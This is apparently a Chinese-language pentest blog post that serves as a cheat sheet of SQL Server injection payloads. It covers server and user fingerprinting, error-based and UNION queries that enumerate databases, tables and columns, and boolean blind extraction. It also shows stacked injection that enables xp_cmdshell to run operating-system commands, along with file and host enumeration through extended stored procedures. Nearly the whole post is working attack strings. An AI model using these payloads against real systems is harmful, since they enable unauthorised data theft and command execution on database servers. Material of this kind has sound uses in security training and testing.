---
draft: false
date: 2018-09-04 10:09:17
title: SQL注入 tips(SQL Server)
description: SQL Server 注入常见的一些注入手法
categories:
  - Pentest
tags:
  - SQL注入
---

### 0x00 基础信息探测
```sql
@@VERSION,@@SERVERNAME,@@SERVICENAME;
--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
--WIN-2008
--MSSQLSERVER

USER,CURRENT_USER,SESSION_USER,SYSTEM_USER;
--dbo
--dbo
--dbo
--sa

USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
--dbo
--wyb
--46530
--sa

USER_ID(),USER_SID();
--1
--<01>

ORIGINAL_LOGIN();
--sa
```

### 0x01 UNION query & error-based 注入
* 判断存在注入

```
and 1=1/and 1=2
```
```sql
select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end);

select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);
```

* 判断是否为sa权限

```sql
select name from msg where id=1 and 1=convert(int,(select is_srvrolemember('sysadmin')));
```

![55](/img/post/20180904-105516.png)

* 得到所有数据库名字
![75](/img/post/20180904-110306.png)

```sql
--得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库
id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=7);
id=1 and 0<>(select name from master.dbo.sysdatabases where dbid=8);

--通过 not in 依次得到数据库名
id=1 and 0<>(select top 1 name from master.dbo.sysdatabases where dbid>6 and name not in (select top 1 name from master.dbo.sysdatabases where dbid>6))
id=1 and 0<>(select top 1 name from master.dbo.sysdatabases where dbid>6 and name not in (select top 2 name from master.dbo.sysdatabases where dbid>6))
```

![75](/img/post/20180904-151240.png)

* 得到数据库test的所有表名（用户创建的表xtype的值是U）
![70](/img/post/20180904-111912.png)

```sql
--得到数据库test的第一张表
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U';

--得到数据库test的第二张表方法一
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in ('article');
--得到数据库test的第二张表方法二
id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype='U' and name not in (select top 1 name from test.dbo.sysobjects where xtype='U');
```
![80](/img/post/20180904-151551.png)

* 得到数据库test的表article的所有列名
    * 可以分两步：先得到article的表id，然后得到列名
    ![60](/img/post/20180904-112859.png)
    ![75](/img/post/20180904-112938.png)

    * <f>也可直接一条命令直接得到列信息</f>
    ```
    select id,name from syscolumns where id=(select id from sysobjects where name='msg');
    ```

* 得到数据库test的表article的数据
![75](/img/post/20180904-113720.png)

### 0x02 boolean-based blind 注入
```sql
?id=1 and substring(db_name(),1,1)='a' --
?id=1 and substring(db_name(),1,1)='b' --
```

```sql
-- 转换为数字
?id=1 and unicode(substring((select db_name()),1,1))>88 --
?id=1 and ascii(substring((select db_name()),1,1))>88 --
```

```sql
-- 转换为16进制
id=1 and (select master.dbo.fn_varbintohexstr(CONVERT(varbinary(30),(substring(db_name(),1,1)))) from master..sysdatabases where dbid=1) not in ('0x7400')
```

### 0x03 Stacked 注入
* 执行系统命令

```bash
#判断xp_cmdshell是否被删除
?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');

#开启xp_cmdshell
?id=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;--

#使用xp_cmdshell执行命令
exec master..xp_cmdshell 'whoami';
```

* 文件操作

```
#列目录、文件
exec master..xp_dirtree 'c:\wwwroot',1 #列c:\wwwroot下的文件夹 
exec master..xp_dirtree 'c:\wwwroot',1,1 #列c:\wwwroot下的文件夹和文件

exec master..xp_subdirs 'c:\wwwroot' #列c:\wwwroot下的文件夹

#显示系统可用盘符
exec master..xp_availablemedia
```

* 主机、中间件信息

```
#获得MS SQL的版本号
exec master..sp_msgetversion

#列出服务器上所有windows本地用户组
exec master..xp_enumgroups

#得到当前sql server服务器的计算机名称
exec master..xp_getnetname

#服务器安全模式信息
exec master..xp_loginconfig
```
